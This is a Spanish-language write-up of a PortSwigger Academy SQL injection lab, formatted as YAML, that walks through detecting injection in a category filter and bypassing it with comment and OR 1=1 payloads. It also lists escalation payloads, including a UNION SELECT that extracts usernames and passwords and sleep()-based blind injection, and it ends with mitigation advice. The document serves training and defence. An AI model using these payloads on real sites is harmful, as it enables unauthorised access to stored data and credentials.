---
title: "SQL Injection - WHERE Clause"
platform: "PortSwigger"
os: "Web Application"
difficulty: "Easy"
ip: "portswigger.net/web-security/sql-injection"
slug: "sqli-where-clause"
author: "Z4k7"
year: "2026"
status: "pwned"
tags:
  - "SQL Injection"
  - "Web Security"
  - "Injection"
  - "PortSwigger"
  - "Authentication Bypass"
techniques:
  - "SQL Injection"
  - "Comment Operator --"
  - "OR 1=1 Bypass"
  - "WHERE Clause Manipulation"
flags:
  user: "Lab Completado"
  root: "Todos los productos visibles"
summary: "Laboratorio de PortSwigger Academy. La aplicación web concatena directamente la entrada del usuario en una cláusula WHERE sin sanitización. Se manipula la consulta SQL usando el operador de comentario -- y OR 1=1 para acceder a productos no lanzados (released = 0)."
steps:
  - id: "recon"
    num: "01"
    title: "Reconocimiento"
    notes: "Se analiza el filtro de categorías de productos. La aplicación construye la consulta SQL dinámicamente con el parámetro category controlado por el usuario sin validación."
    code_title: "Consulta SQL original vulnerable"
    code_lang: "SQL"
    code: |
      SELECT * FROM products WHERE category = 'Gifts' AND released = 1;

      -- category: parámetro controlado por el usuario
      -- released = 1: restringe productos ya publicados
      -- Sin sanitización en category → inyección posible
    callout_type: "info"
    callout_label: "Observación clave"
    callout_text: "La falta de sanitización en el parámetro category permite inyectar operadores lógicos y comentarios para alterar la consulta original."

  - id: "enum"
    num: "02"
    title: "Detección de la Vulnerabilidad"
    notes: "Se prueba el carácter ' para verificar si la entrada se concatena directamente en la consulta SQL y si genera errores visibles en la interfaz."
    code_title: "Payload de detección"
    code_lang: "BASH"
    code: |
      # Payload enviado en el parámetro category:
      '

      # URL resultante:
      https://target.web-security-academy.net/filter?category='

      # La aplicación devuelve un error SQL visible
    callout_type: "warning"
    callout_label: "Red Flags detectados"
    callout_text: "Error SQL visible en la interfaz. Respuestas inesperadas al usar ' o --. Esto confirma que la entrada afecta directamente la consulta."

  - id: "exploit"
    num: "03"
    title: "Explotación — Bypass con Comentario"
    notes: "Se utiliza el operador de comentario -- para anular la condición released = 1 y acceder a productos no lanzados."
    code_title: "Payload — anular condición"
    code_lang: "SQL"
    code: |
      # Payload:
      Gifts' --

      # Consulta resultante en el servidor:
      SELECT * FROM products WHERE category = 'Gifts' --' AND released = 1;

      # El -- comenta el resto → released = 1 es ignorado
      # Resultado: muestra productos de Gifts incluyendo no lanzados
    callout_type: "info"
    callout_label: "¿Por qué funciona?"
    callout_text: "El operador -- en SQL comenta todo lo que sigue. La condición AND released = 1 queda anulada, permitiendo ver productos con released = 0."

  - id: "access"
    num: "04"
    title: "Explotación — OR 1=1"
    notes: "Se aplica un OR lógico para forzar la inclusión de TODOS los registros de todas las categorías, incluyendo los no lanzados."
    code_title: "Payload — todos los registros"
    code_lang: "SQL"
    code: |
      # Payload:
      Gifts' OR 1=1 --

      # Consulta resultante en el servidor:
      SELECT * FROM products WHERE category = 'Gifts' OR 1=1 --' AND released = 1;

      # OR 1=1 siempre es TRUE → devuelve TODOS los productos
      # Resultado: todas las categorías y productos visibles
    callout_type: "danger"
    callout_label: "Impacto"
    callout_text: "Bypass completo de la restricción released = 1. Acceso a productos ocultos. Posible escalada hacia exfiltración de datos con UNION SELECT o blind SQLi con sleep()."

  - id: "privesc"
    num: "05"
    title: "Técnicas Avanzadas"
    notes: "Una vez confirmada la inyección básica, se pueden aplicar técnicas más avanzadas para ampliar el impacto del ataque."
    code_title: "Técnicas de escalada SQLi"
    code_lang: "SQL"
    code: |
      # UNION SELECT para extraer datos de otras tablas:
      Gifts' UNION SELECT null, username, password FROM users --

      # Blind SQLi con tiempo para detectar sin errores visibles:
      Gifts' AND sleep(5) --

      # Extracción de versión de la DB:
      Gifts' UNION SELECT null, version(), null --
    callout_type: "warning"
    callout_label: "Bypasses adicionales"
    callout_text: "Uso de comentarios -- para anular condiciones. Operadores lógicos OR/AND para modificar filtros. UNION SELECT para exfiltración. sleep() para detección blind SQLi."
    bullet_list:
      - "Validar con ' → si hay error, hay inyección"
      - "Usar -- para comentar condiciones posteriores"
      - "Aplicar OR 1=1 para forzar todos los registros"
      - "Escalar con UNION SELECT para extraer datos sensibles"
      - "Usar sleep() para detectar blind SQLi sin errores visibles"

  - id: "root"
    num: "06"
    title: "Resultado Final"
    notes: "El laboratorio se completa al visualizar todos los productos no lanzados. Se confirma la manipulación exitosa de la consulta SQL."
    code_title: "Resumen del ataque"
    code_lang: "SQL"
    code: |
      -- Paso 1: Detectar con '
      category='

      -- Paso 2: Bypass con comentario
      category=Gifts' --

      -- Paso 3: Todos los registros
      category=Gifts' OR 1=1 --

      -- Lab completado: productos no lanzados visibles ✓
    callout_type: null
    callout_label: ""
    callout_text: ""

lessons:
  - "Memoriza la secuencia: validación con ' → comentario -- → lógica OR 1=1"
  - "Los errores SQL visibles en la interfaz son Red Flags críticos en cualquier auditoría"
  - "El operador -- comenta el resto de la consulta — úsalo para anular condiciones"
  - "OR 1=1 siempre evalúa TRUE, forzando la devolución de todos los registros"
  - "Este caso es ejemplo clásico de SQLi y aparece frecuentemente en entrevistas técnicas"
mitigation: "Implementar consultas parametrizadas (Prepared Statements). Validar y sanitizar todas las entradas de usuario. Restringir mensajes de error detallados en producción. Aplicar principio de mínimo privilegio en la base de datos. Monitorear patrones anómalos como OR 1=1 y -- en los logs."
---
